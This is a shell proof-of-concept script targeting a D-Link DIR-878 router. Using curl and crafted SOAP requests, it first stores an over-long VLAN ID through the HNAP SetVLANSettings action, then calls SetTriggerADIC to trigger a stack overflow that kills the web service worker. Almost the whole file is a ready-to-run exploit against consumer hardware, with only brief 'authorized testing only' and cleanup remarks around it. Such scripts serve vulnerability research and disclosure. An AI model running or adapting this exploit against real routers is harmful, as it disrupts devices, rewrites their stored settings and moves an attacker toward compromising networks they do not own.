#!/bin/sh
# Reproduction script for: DIR-878 SetVLANSettings -> SetTriggerADIC second-order stack overflow
# Derived from the requests recorded in README.md.
# NON-DESTRUCTIVE CAVEAT: step 1 writes the VID into nvram (wan_wan0_ifname). Restore VLAN
# settings via the web UI afterwards. The crash itself is transient (worker auto-restarts).
# Authorized testing only.
T="${1:?usage: sh poc.sh <router-ip>}"
post() {
  curl -s -o /dev/null -w "    HTTP %{http_code}\n" -X POST "http://$T/HNAP1/?GetCAPTCHAsetting" \
    -H "SOAPAction: \"http://purenetworks.com/HNAP1/$1\"" \
    -H 'Content-Type: text/xml' --data-binary "$2"
}
VID="1$(printf 'D%.0s' $(seq 180))"
X1="<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><SetVLANSettings xmlns=\"http://purenetworks.com/HNAP1/\"><Enabled>true</Enabled><PriorityEnabled>false</PriorityEnabled><ISPName>x</ISPName><VLANIDInfoLists><VLANID><VID>$VID</VID><Priority>0</Priority></VLANID><VLANID><VID>2</VID><Priority>0</Priority><VendorClass>x</VendorClass></VLANID><VLANID><VID>3</VID><Priority>0</Priority><VendorClass>x</VendorClass></VLANID></VLANIDInfoLists><VLANRuleInfoLists><VLANRule><ServiceMapping>LAN1</ServiceMapping></VLANRule><VLANRule><ServiceMapping>LAN1</ServiceMapping></VLANRule><VLANRule><ServiceMapping>LAN1</ServiceMapping></VLANRule><VLANRule><ServiceMapping>LAN1</ServiceMapping></VLANRule><VLANRule><ServiceMapping>LAN1</ServiceMapping></VLANRule></VLANRuleInfoLists></SetVLANSettings></soap:Body></soap:Envelope>"
X2='<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetTriggerADIC xmlns="http://purenetworks.com/HNAP1/"><TriggerADIC>true</TriggerADIC></SetTriggerADIC></soap:Body></soap:Envelope>'
echo "[*] Step 1: store over-long VID (expect 200, SetVLANSettingsResult OK)"
post SetVLANSettings "$X1"
echo "[*] Step 2: trigger (expect 500, FastCGI worker death + core)"
post SetTriggerADIC "$X2"
echo "[*] CLEANUP: reset VLAN settings in the web UI, or reboot to the last saved config."
